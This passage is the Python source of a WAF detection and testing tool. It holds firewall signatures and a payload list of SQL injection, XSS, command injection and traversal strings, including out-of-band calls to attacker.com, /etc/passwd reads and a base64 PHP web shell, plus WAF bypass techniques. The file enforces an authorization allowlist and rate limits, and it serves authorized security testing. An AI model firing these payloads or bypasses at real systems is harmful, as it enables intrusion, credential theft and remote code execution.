#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
    TSUNAMI WAF CHECKER v5.0
    Web Application Firewall Detection and Testing Module
================================================================================

    Features:
    - Detection of 20+ WAF types (Cloudflare, AWS WAF, ModSecurity, etc.)
    - Three-phase detection: passive headers, active probes, evasion confirmation
    - Payload testing for SQLi, XSS, Command Injection, Path Traversal
    - Multiple encoding variations (URL, Unicode, Base64, Hex)
    - Bypass technique suggestions per WAF type

    IMPORTANT: For authorized security testing only.
    This tool should only be used on systems you own or have explicit
    permission to test. Unauthorized use is illegal.

================================================================================
"""

import re
import json
import base64
import hashlib
import logging
import asyncio
import urllib.parse
import random
import time
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Any, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
from abc import ABC, abstractmethod

import aiohttp
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# ==============================================================================
# ENUMS AND DATA CLASSES
# ==============================================================================

class WAFType(Enum):
    """Supported WAF types for detection"""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AWS_SHIELD = "aws_shield"
    MODSECURITY = "modsecurity"
    IMPERVA = "imperva"
    AKAMAI = "akamai"
    F5_BIG_IP = "f5_big_ip"
    SUCURI = "sucuri"
    BARRACUDA = "barracuda"
    FORTINET = "fortinet"
    CITRIX_NETSCALER = "citrix_netscaler"
    PALO_ALTO = "palo_alto"
    SOPHOS = "sophos"
    COMODO = "comodo"
    WORDFENCE = "wordfence"
    AZURE_WAF = "azure_waf"
    GOOGLE_CLOUD_ARMOR = "google_cloud_armor"
    FASTLY = "fastly"
    RADWARE = "radware"
    REBLAZE = "reblaze"
    WALLARM = "wallarm"
    SQREEN = "sqreen"
    STACKPATH = "stackpath"
    INCAPSULA = "incapsula"
    UNKNOWN = "unknown"
    NONE = "none"


class PayloadCategory(Enum):
    """Categories of attack payloads"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    SSTI = "ssti"


class EncodingType(Enum):
    """Encoding types for payload obfuscation"""
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    UNICODE = "unicode"
    BASE64 = "base64"
    HEX = "hex"
    HTML_ENTITY = "html_entity"
    MIXED = "mixed"


class BlockStatus(Enum):
    """Block status for payload testing"""
    BLOCKED = "blocked"
    PASSED = "passed"
    UNKNOWN = "unknown"
    ERROR = "error"


@dataclass
class WAFSignature:
    """WAF detection signature"""
    waf_type: WAFType
    header_patterns: List[Tuple[str, str]] = field(default_factory=list)
    cookie_patterns: List[str] = field(default_factory=list)
    body_patterns: List[str] = field(default_factory=list)
    status_codes: List[int] = field(default_factory=list)
    specific_headers: List[str] = field(default_factory=list)


@dataclass
class WAFDetectionResult:
    """Result of WAF detection"""
    detected: bool
    waf_type: WAFType
    confidence: float  # 0.0 - 1.0
    detection_phase: str  # passive, active, evasion
    evidence: List[str] = field(default_factory=list)
    headers_found: Dict[str, str] = field(default_factory=dict)
    response_code: int = 0
    detection_time: datetime = field(default_factory=datetime.now)
    additional_info: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "detected": self.detected,
            "waf_type": self.waf_type.value,
            "confidence": self.confidence,
            "detection_phase": self.detection_phase,
            "evidence": self.evidence,
            "headers_found": self.headers_found,
            "response_code": self.response_code,
            "detection_time": self.detection_time.isoformat(),
            "additional_info": self.additional_info,
        }


@dataclass
class PayloadTestResult:
    """Result of payload testing"""
    payload: str
    category: PayloadCategory
    encoding: EncodingType
    status: BlockStatus
    response_code: int
    response_time: float
    blocked_by_waf: bool
    evidence: str = ""
    bypass_possible: bool = False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "payload": self.payload[:100] + "..." if len(self.payload) > 100 else self.payload,
            "category": self.category.value,
            "encoding": self.encoding.value,
            "status": self.status.value,
            "response_code": self.response_code,
            "response_time": self.response_time,
            "blocked_by_waf": self.blocked_by_waf,
            "evidence": self.evidence,
            "bypass_possible": self.bypass_possible,
        }


@dataclass
class BypassSuggestion:
    """WAF bypass technique suggestion"""
    technique: str
    description: str
    examples: List[str]
    success_rate: float  # Historical success rate
    applicable_to: List[WAFType]
    risk_level: str  # low, medium, high

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "technique": self.technique,
            "description": self.description,
            "examples": self.examples,
            "success_rate": self.success_rate,
            "applicable_to": [w.value for w in self.applicable_to],
            "risk_level": self.risk_level,
        }


# ==============================================================================
# WAF SIGNATURES DATABASE
# ==============================================================================

WAF_SIGNATURES: List[WAFSignature] = [
    WAFSignature(
        waf_type=WAFType.CLOUDFLARE,
        header_patterns=[
            ("Server", r"cloudflare"),
            ("CF-RAY", r".+"),
            ("CF-Cache-Status", r".+"),
            ("cf-request-id", r".+"),
        ],
        cookie_patterns=[r"__cfduid", r"__cf_bm", r"cf_clearance"],
        body_patterns=[
            r"Cloudflare Ray ID",
            r"cloudflare\.com/5xx-error-landing",
            r"Attention Required! \| Cloudflare",
            r"cf-error-details",
        ],
        status_codes=[403, 503, 520, 521, 522, 523, 524],
        specific_headers=["CF-RAY", "CF-Cache-Status"],
    ),
    WAFSignature(
        waf_type=WAFType.AWS_WAF,
        header_patterns=[
            ("X-AMZ-CF-ID", r".+"),
            ("X-AMZ-ID-2", r".+"),
            ("X-AMZ-REQUEST-ID", r".+"),
        ],
        cookie_patterns=[r"awsalb", r"awsalbcors", r"AWSALB"],
        body_patterns=[
            r"Request blocked",
            r"This request has been blocked by AWS WAF",
        ],
        status_codes=[403, 503],
        specific_headers=["X-AMZ-CF-ID"],
    ),
    WAFSignature(
        waf_type=WAFType.MODSECURITY,
        header_patterns=[
            ("Server", r"mod_security|ModSecurity|NOYB"),
        ],
        cookie_patterns=[],
        body_patterns=[
            r"Mod_Security",
            r"ModSecurity Action",
            r"This error was generated by Mod_Security",
            r"NOYB",
            r"Not Acceptable!",
            r"Reference #[0-9a-f.-]+",
        ],
        status_codes=[403, 406, 501],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.IMPERVA,
        header_patterns=[
            ("X-CDN", r"Incapsula|Imperva"),
            ("X-Iinfo", r".+"),
        ],
        cookie_patterns=[r"incap_ses", r"visid_incap", r"nlbi_"],
        body_patterns=[
            r"Incapsula incident ID",
            r"Powered by Incapsula",
            r"_Incapsula_Resource",
            r"Request unsuccessful. Incapsula incident",
        ],
        status_codes=[403],
        specific_headers=["X-CDN", "X-Iinfo"],
    ),
    WAFSignature(
        waf_type=WAFType.AKAMAI,
        header_patterns=[
            ("Server", r"AkamaiGHost|AkamaiNetStorage"),
            ("X-Akamai-Transformed", r".+"),
            ("Akamai-Origin-Hop", r".+"),
        ],
        cookie_patterns=[r"akamai", r"ak_bmsc", r"bm_sv", r"_abck"],
        body_patterns=[
            r"Access Denied",
            r"Reference #[0-9a-f.-]+",
            r"akamaiedge\.net",
        ],
        status_codes=[403],
        specific_headers=["X-Akamai-Transformed"],
    ),
    WAFSignature(
        waf_type=WAFType.F5_BIG_IP,
        header_patterns=[
            ("Server", r"BIG-IP|BigIP|F5"),
            ("X-WA-Info", r".+"),
        ],
        cookie_patterns=[r"BIGipServer", r"TS[a-zA-Z0-9]{8}"],
        body_patterns=[
            r"The requested URL was rejected",
            r"Please consult with your administrator",
            r"F5 Networks",
            r"BIG-IP",
        ],
        status_codes=[403, 503],
        specific_headers=["X-WA-Info"],
    ),
    WAFSignature(
        waf_type=WAFType.SUCURI,
        header_patterns=[
            ("Server", r"Sucuri|Sucuri/Cloudproxy"),
            ("X-Sucuri-ID", r".+"),
            ("X-Sucuri-Cache", r".+"),
        ],
        cookie_patterns=[r"sucuri_cloudproxy"],
        body_patterns=[
            r"Sucuri WebSite Firewall",
            r"Access Denied - Sucuri Website Firewall",
            r"sucuri\.net/privacy-policy",
        ],
        status_codes=[403, 503],
        specific_headers=["X-Sucuri-ID"],
    ),
    WAFSignature(
        waf_type=WAFType.BARRACUDA,
        header_patterns=[
            ("Server", r"Barracuda"),
        ],
        cookie_patterns=[r"barra_counter_session", r"BNI__"],
        body_patterns=[
            r"Barracuda",
            r"You have been blocked",
            r"barracuda\.com",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.FORTINET,
        header_patterns=[
            ("Server", r"FortiWeb|FortiGate"),
        ],
        cookie_patterns=[r"FORTIWAFSID"],
        body_patterns=[
            r"FortiGuard intrusion prevention",
            r"Fortinet",
            r".fgd_icon",
            r"fortigate",
        ],
        status_codes=[403, 503],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.CITRIX_NETSCALER,
        header_patterns=[
            ("Via", r"NS-CACHE"),
            ("Connection", r"ns_af"),
        ],
        cookie_patterns=[r"NSC_", r"citrix_ns"],
        body_patterns=[
            r"NS Transaction id",
            r"Citrix",
            r"NetScaler",
        ],
        status_codes=[403, 503],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.PALO_ALTO,
        header_patterns=[],
        cookie_patterns=[],
        body_patterns=[
            r"Access has been blocked",
            r"Palo Alto",
            r"has been blocked in accordance with company policy",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.SOPHOS,
        header_patterns=[],
        cookie_patterns=[],
        body_patterns=[
            r"Sophos",
            r"This request could not be processed",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.COMODO,
        header_patterns=[
            ("Server", r"Protected by COMODO"),
        ],
        cookie_patterns=[],
        body_patterns=[
            r"COMODO WAF",
            r"Protected by COMODO",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.WORDFENCE,
        header_patterns=[],
        cookie_patterns=[r"wfvt_", r"wordfence"],
        body_patterns=[
            r"Generated by Wordfence",
            r"Wordfence",
            r"Your access to this site has been limited",
            r"wordfence\.com",
        ],
        status_codes=[403, 503],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.AZURE_WAF,
        header_patterns=[
            ("X-Azure-Ref", r".+"),
            ("X-MS-Ref", r".+"),
        ],
        cookie_patterns=[],
        body_patterns=[
            r"This request has been blocked",
            r"Azure Web Application Firewall",
            r"WindowsAzure",
        ],
        status_codes=[403],
        specific_headers=["X-Azure-Ref"],
    ),
    WAFSignature(
        waf_type=WAFType.GOOGLE_CLOUD_ARMOR,
        header_patterns=[
            ("Via", r"[0-9.]+ google"),
            ("Server", r"Google Frontend"),
        ],
        cookie_patterns=[],
        body_patterns=[
            r"Error 403 \(Forbidden\)",
            r"That's an error",
            r"Google Cloud Armor",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.FASTLY,
        header_patterns=[
            ("Via", r"varnish"),
            ("X-Served-By", r"cache-"),
            ("X-Cache", r"(HIT|MISS)"),
            ("X-Cache-Hits", r"\d+"),
        ],
        cookie_patterns=[],
        body_patterns=[
            r"Fastly error:",
            r"fastly\.net",
        ],
        status_codes=[403, 503],
        specific_headers=["X-Served-By", "X-Cache"],
    ),
    WAFSignature(
        waf_type=WAFType.RADWARE,
        header_patterns=[
            ("X-SL-CompState", r".+"),
        ],
        cookie_patterns=[r"rd[a-z0-9]+"],
        body_patterns=[
            r"Radware",
            r"AppWall",
            r"Unauthorized Activity Has Been Detected",
        ],
        status_codes=[403],
        specific_headers=["X-SL-CompState"],
    ),
    WAFSignature(
        waf_type=WAFType.REBLAZE,
        header_patterns=[
            ("Server", r"Reblaze Secure Web Gateway"),
        ],
        cookie_patterns=[r"rbzid", r"rbzsessionid"],
        body_patterns=[
            r"Access Denied by Reblaze",
            r"Reblaze",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.WALLARM,
        header_patterns=[],
        cookie_patterns=[],
        body_patterns=[
            r"Wallarm",
            r"nginx-wallarm",
        ],
        status_codes=[403],
        specific_headers=[],
    ),
    WAFSignature(
        waf_type=WAFType.STACKPATH,
        header_patterns=[
            ("X-SP-AMS", r".+"),
            ("X-SP-Edge-Host", r".+"),
        ],
        cookie_patterns=[],
        body_patterns=[
            r"StackPath",
            r"Request blocked by edge",
        ],
        status_codes=[403],
        specific_headers=["X-SP-AMS"],
    ),
]


# ==============================================================================
# PAYLOADS DATABASE
# ==============================================================================

class PayloadDatabase:
    """Database of attack payloads for testing"""

    SQL_INJECTION = [
        # Basic SQLi
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        '" OR "1"="1',
        "1' OR '1'='1",
        "admin'--",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        # Time-based blind
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1'; SELECT PG_SLEEP(5)--",
        # Error-based
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        # Out-of-band
        "'; EXEC xp_cmdshell('ping attacker.com')--",
        # Second-order
        "admin'-- test",
    ]

    XSS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        # Attribute injection
        "'><script>alert('XSS')</script>",
        '"><script>alert("XSS")</script>',
        "'-alert(1)-'",
        '"-alert(1)-"',
        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        # DOM XSS
        "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        # Polyglots
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    ]

    COMMAND_INJECTION = [
        # Basic command injection
        "; ls -la",
        "| ls -la",
        "` ls -la `",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "& dir",
        "| type C:\\Windows\\win.ini",
        # Chained commands
        "|| ls",
        "&& ls",
        "; ls; whoami",
        # Background execution
        "| sleep 10 &",
        "| nslookup attacker.com &",
        # Newline injection
        "\nls\n",
        "%0als",
        # Encoded
        "|`echo${IFS}cHdk|base64${IFS}-d`",
    ]

    PATH_TRAVERSAL = [
        # Basic traversal
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../etc/shadow",
        "..\\..\\..\\windows\\win.ini",
        # Encoded traversal
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        # Null byte injection
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        # Absolute paths
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        # Filter bypass
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "..%c0%ae%c0%ae/..%c0%ae%c0%ae/etc/passwd",
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
    ]


# ==============================================================================
# ENCODING UTILITIES
# ==============================================================================

class EncodingUtils:
    """Utilities for payload encoding and obfuscation"""

    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode a payload"""
        return urllib.parse.quote(payload, safe='')

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode a payload"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode special characters"""
        result = ""
        for char in payload:
            if ord(char) > 127 or char in "<>\"'&/\\;":
                result += "\\u{:04x}".format(ord(char))
            else:
                result += char
        return result

    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode a payload"""
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode a payload"""
        return ''.join(['%{:02x}'.format(ord(c)) for c in payload])

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML entity encode special characters"""
        result = ""
        for char in payload:
            if char in "<>\"'&":
                result += "&#{};".format(ord(char))
            else:
                result += char
        return result

    @staticmethod
    def mixed_encode(payload: str) -> str:
        """Apply mixed encoding (random for each character)"""
        encodings = [
            lambda c: c,
            lambda c: urllib.parse.quote(c, safe=''),
            lambda c: "\\u{:04x}".format(ord(c)) if c in "<>\"'&" else c,
        ]
        result = ""
        for char in payload:
            encoder = random.choice(encodings)
            result += encoder(char)
        return result

    @classmethod
    def encode(cls, payload: str, encoding_type: EncodingType) -> str:
        """Apply specified encoding to payload"""
        encoders = {
            EncodingType.NONE: lambda p: p,
            EncodingType.URL: cls.url_encode,
            EncodingType.DOUBLE_URL: cls.double_url_encode,
            EncodingType.UNICODE: cls.unicode_encode,
            EncodingType.BASE64: cls.base64_encode,
            EncodingType.HEX: cls.hex_encode,
            EncodingType.HTML_ENTITY: cls.html_entity_encode,
            EncodingType.MIXED: cls.mixed_encode,
        }
        return encoders.get(encoding_type, lambda p: p)(payload)


# ==============================================================================
# BYPASS TECHNIQUES DATABASE
# ==============================================================================

BYPASS_TECHNIQUES: List[BypassSuggestion] = [
    BypassSuggestion(
        technique="Comment-based Obfuscation",
        description="Insert SQL comments to break up keywords",
        examples=[
            "UN/**/ION SEL/**/ECT",
            "1'/**/OR/**/1=1--",
            "SEL%00ECT",
        ],
        success_rate=0.65,
        applicable_to=[WAFType.MODSECURITY, WAFType.CLOUDFLARE, WAFType.IMPERVA],
        risk_level="low",
    ),
    BypassSuggestion(
        technique="Case Variation",
        description="Mix uppercase and lowercase letters",
        examples=[
            "SeLeCt",
            "UnIoN sElEcT",
            "<ScRiPt>alert(1)</ScRiPt>",
        ],
        success_rate=0.45,
        applicable_to=[WAFType.MODSECURITY, WAFType.WORDFENCE, WAFType.SUCURI],
        risk_level="low",
    ),
    BypassSuggestion(
        technique="Double Encoding",
        description="Apply URL encoding twice",
        examples=[
            "%252f%252e%252e%252f",  # /../
            "%2527",  # '
            "%253c%2573%2563%2572%2569%2570%2574%253e",  # <script>
        ],
        success_rate=0.55,
        applicable_to=[WAFType.AWS_WAF, WAFType.AKAMAI, WAFType.CLOUDFLARE],
        risk_level="medium",
    ),
    BypassSuggestion(
        technique="Unicode Normalization",
        description="Use Unicode characters that normalize to ASCII",
        examples=[
            "\\u0027 OR \\u00271\\u0027=\\u00271",  # ' OR '1'='1
            "\\uFF1Cscript\\uFF1E",  # <script>
            "%c0%af",  # /
        ],
        success_rate=0.50,
        applicable_to=[WAFType.CLOUDFLARE, WAFType.F5_BIG_IP, WAFType.IMPERVA],
        risk_level="medium",
    ),
    BypassSuggestion(
        technique="HPP (HTTP Parameter Pollution)",
        description="Send duplicate parameters with different values",
        examples=[
            "id=1&id=' OR '1'='1",
            "?q=safe&q=<script>",
        ],
        success_rate=0.40,
        applicable_to=[WAFType.AWS_WAF, WAFType.AKAMAI, WAFType.MODSECURITY],
        risk_level="low",
    ),
    BypassSuggestion(
        technique="HTTP Method Override",
        description="Use method override headers",
        examples=[
            "X-HTTP-Method-Override: PUT",
            "X-Method-Override: DELETE",
        ],
        success_rate=0.35,
        applicable_to=[WAFType.AWS_WAF, WAFType.CLOUDFLARE],
        risk_level="low",
    ),
    BypassSuggestion(
        technique="Null Byte Injection",
        description="Insert null bytes to terminate strings",
        examples=[
            "payload%00.jpg",
            "../../../etc/passwd%00",
        ],
        success_rate=0.30,
        applicable_to=[WAFType.MODSECURITY, WAFType.WORDFENCE],
        risk_level="medium",
    ),
    BypassSuggestion(
        technique="Whitespace Variations",
        description="Use alternative whitespace characters",
        examples=[
            "SELECT%09*%09FROM",  # tab
            "SELECT%0B*%0BFROM",  # vertical tab
            "SELECT%0C*%0CFROM",  # form feed
        ],
        success_rate=0.45,
        applicable_to=[WAFType.MODSECURITY, WAFType.CLOUDFLARE, WAFType.IMPERVA],
        risk_level="low",
    ),
    BypassSuggestion(
        technique="Content-Type Manipulation",
        description="Change Content-Type to bypass inspection",
        examples=[
            "Content-Type: multipart/form-data",
            "Content-Type: text/xml",
        ],
        success_rate=0.40,
        applicable_to=[WAFType.AWS_WAF, WAFType.CLOUDFLARE, WAFType.AKAMAI],
        risk_level="low",
    ),
    BypassSuggestion(
        technique="Chunk Transfer Encoding",
        description="Split payload across chunked transfer",
        examples=[
            "Transfer-Encoding: chunked",
        ],
        success_rate=0.35,
        applicable_to=[WAFType.CLOUDFLARE, WAFType.AWS_WAF],
        risk_level="medium",
    ),
]


# ==============================================================================
# USER AGENT ROTATION
# ==============================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]


# ==============================================================================
# AUTHORIZATION CHECKER
# ==============================================================================

class AuthorizationChecker:
    """Safety checks to prevent misuse"""

    def __init__(self):
        self._authorized_targets: Set[str] = set()
        self._authorization_file: Optional[str] = None

    def add_authorized_target(self, target: str):
        """Add a target to the authorized list"""
        parsed = urllib.parse.urlparse(target)
        if parsed.netloc:
            self._authorized_targets.add(parsed.netloc)
        else:
            self._authorized_targets.add(target)

    def remove_authorized_target(self, target: str):
        """Remove a target from the authorized list"""
        parsed = urllib.parse.urlparse(target)
        if parsed.netloc:
            self._authorized_targets.discard(parsed.netloc)
        else:
            self._authorized_targets.discard(target)

    def is_authorized(self, url: str) -> bool:
        """Check if a URL is authorized for testing"""
        if not self._authorized_targets:
            logger.warning("[WAF-CHECK] No authorized targets configured - testing may be unauthorized")
            return False

        parsed = urllib.parse.urlparse(url)
        hostname = parsed.netloc or parsed.path.split('/')[0]

        # Check exact match
        if hostname in self._authorized_targets:
            return True

        # Check wildcard patterns
        for target in self._authorized_targets:
            if target.startswith('*.'):
                domain = target[2:]
                if hostname.endswith(domain) or hostname == domain:
                    return True
            elif hostname == target:
                return True

        return False

    def require_authorization(self, url: str) -> None:
        """Raise exception if URL is not authorized"""
        if not self.is_authorized(url):
            raise PermissionError(
                f"Target '{url}' is not in the authorized targets list. "
                "Add it using add_authorized_target() before testing."
            )


# ==============================================================================
# RATE LIMITER
# ==============================================================================

class RateLimiter:
    """Rate limiter for requests"""

    def __init__(self, requests_per_second: float = 10.0, burst_limit: int = 20):
        self.requests_per_second = requests_per_second
        self.burst_limit = burst_limit
        self._tokens = float(burst_limit)
        self._last_update = time.time()
        self._lock = asyncio.Lock() if asyncio.get_event_loop_policy() else None

    def _update_tokens(self):
        """Update available tokens based on elapsed time"""
        now = time.time()
        elapsed = now - self._last_update
        self._tokens = min(self.burst_limit, self._tokens + elapsed * self.requests_per_second)
        self._last_update = now

    def acquire(self) -> bool:
        """Acquire a token for rate limiting (sync)"""
        self._update_tokens()
        if self._tokens >= 1.0:
            self._tokens -= 1.0
            return True
        return False

    async def acquire_async(self) -> bool:
        """Acquire a token for rate limiting (async)"""
        if self._lock:
            async with self._lock:
                return self.acquire()
        return self.acquire()

    def wait_sync(self):
        """Wait until a token is available (sync)"""
        while not self.acquire():
            time.sleep(0.1)

    async def wait_async(self):
        """Wait until a token is available (async)"""
        while not await self.acquire_async():
            await asyncio.sleep(0.1)


# ==============================================================================
# WAF CHECKER MAIN CLASS
# ==============================================================================

class WAFChecker:
    """
    Web Application Firewall Detection and Testing

    Features:
    - Detect 20+ WAF types
    - Three-phase detection (passive, active, evasion)
    - Payload testing with multiple encodings
    - Bypass technique suggestions
    - Rate limiting and user-agent rotation
    """

    def __init__(
        self,
        authorized_targets: List[str] = None,
        requests_per_second: float = 10.0,
        timeout: float = 10.0,
        verify_ssl: bool = False,
    ):
        """
        Initialize WAF Checker

        Args:
            authorized_targets: List of authorized target domains/URLs
            requests_per_second: Rate limit for requests
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl

        # Authorization
        self.auth_checker = AuthorizationChecker()
        if authorized_targets:
            for target in authorized_targets:
                self.auth_checker.add_authorized_target(target)

        # Rate limiting
        self.rate_limiter = RateLimiter(requests_per_second=requests_per_second)

        # HTTP session with retry logic
        self._session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self._session.mount("http://", adapter)
        self._session.mount("https://", adapter)

        # Async session placeholder
        self._async_session: Optional[aiohttp.ClientSession] = None

        # Results storage
        self._detection_results: Dict[str, WAFDetectionResult] = {}
        self._payload_results: Dict[str, List[PayloadTestResult]] = {}

        logger.info("[WAF-CHECK] WAFChecker initialized")

    def _get_random_user_agent(self) -> str:
        """Get a random user agent"""
        return random.choice(USER_AGENTS)

    def _get_headers(self) -> Dict[str, str]:
        """Get request headers with random user agent"""
        return {
            "User-Agent": self._get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }

    # ==========================================================================
    # PHASE 1: PASSIVE DETECTION (Headers)
    # ==========================================================================

    def _detect_passive(self, url: str) -> Tuple[Optional[WAFType], float, List[str], Dict[str, str]]:
        """
        Passive WAF detection via headers

        Returns:
            Tuple of (WAFType, confidence, evidence, headers)
        """
        try:
            self.rate_limiter.wait_sync()
            response = self._session.get(
                url,
                headers=self._get_headers(),
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=True,
            )

            headers = dict(response.headers)
            cookies = response.cookies.get_dict()
            evidence = []

            for signature in WAF_SIGNATURES:
                confidence = 0.0
                matches = 0

                # Check header patterns
                for header_name, pattern in signature.header_patterns:
                    if header_name.lower() in [h.lower() for h in headers]:
                        header_value = headers.get(header_name) or headers.get(header_name.lower())
                        if header_value and re.search(pattern, header_value, re.IGNORECASE):
                            matches += 1
                            evidence.append(f"Header {header_name}: {header_value}")

                # Check specific headers existence
                for header in signature.specific_headers:
                    if header.lower() in [h.lower() for h in headers]:
                        matches += 0.5
                        evidence.append(f"Specific header found: {header}")

                # Check cookies
                for cookie_pattern in signature.cookie_patterns:
                    for cookie_name in cookies:
                        if re.search(cookie_pattern, cookie_name, re.IGNORECASE):
                            matches += 0.5
                            evidence.append(f"Cookie pattern matched: {cookie_name}")

                if matches > 0:
                    # Calculate confidence based on matches
                    total_checks = len(signature.header_patterns) + len(signature.specific_headers) + len(signature.cookie_patterns)
                    confidence = min(1.0, matches / max(total_checks, 1))

                    if confidence >= 0.3:
                        return signature.waf_type, confidence, evidence, headers

        except Exception as e:
            logger.debug(f"[WAF-CHECK] Passive detection error: {e}")

        return None, 0.0, [], {}

    # ==========================================================================
    # PHASE 2: ACTIVE DETECTION (Trigger WAF)
    # ==========================================================================

    def _detect_active(self, url: str) -> Tuple[Optional[WAFType], float, List[str], int]:
        """
        Active WAF detection by sending attack payloads

        Returns:
            Tuple of (WAFType, confidence, evidence, response_code)
        """
        # Attack payloads to trigger WAF
        trigger_payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "; cat /etc/passwd",
            "{{7*7}}",
        ]

        best_match = None
        best_confidence = 0.0
        best_evidence = []
        response_code = 0

        for payload in trigger_payloads:
            try:
                self.rate_limiter.wait_sync()

                # Try both GET parameter and URL path
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{url}?test={encoded_payload}"

                response = self._session.get(
                    test_url,
                    headers=self._get_headers(),
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                )

                response_code = response.status_code
                response_text = response.text
                headers = dict(response.headers)

                for signature in WAF_SIGNATURES:
                    confidence = 0.0
                    evidence = []

                    # Check status codes
